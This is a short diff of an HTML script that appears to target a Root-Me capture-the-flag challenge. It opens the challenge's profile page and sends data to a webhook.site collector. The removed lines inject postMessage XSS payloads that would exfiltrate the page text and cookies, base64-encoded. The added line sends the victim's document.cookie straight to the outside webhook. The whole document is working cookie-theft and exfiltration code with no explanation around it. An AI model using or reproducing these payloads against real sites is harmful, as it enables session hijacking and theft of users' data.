@@ -1,14 +1,5 @@
 <script>
 var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
 var w = window.open('http://challenge01.root-me.org:58003/profile');
-new Image().src = wb + '?popup=' + (w ? 'ok' : 'blocked');
-
-if (w) {
-  setTimeout(function() {
-    w.postMessage('<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.body.innerText)">', '*');
-    w.postMessage("new Image().src='" + wb + "?d='+btoa(document.body.innerText)", '*');
-    w.postMessage('<img src=x onerror="new Image().src=\'' + wb + '?c=\'+btoa(document.cookie)">', '*');
-    new Image().src = wb + '?msg=sent';
-  }, 2000);
-}
+new Image().src = wb + '?c=' + btoa(document.cookie);
 </script>
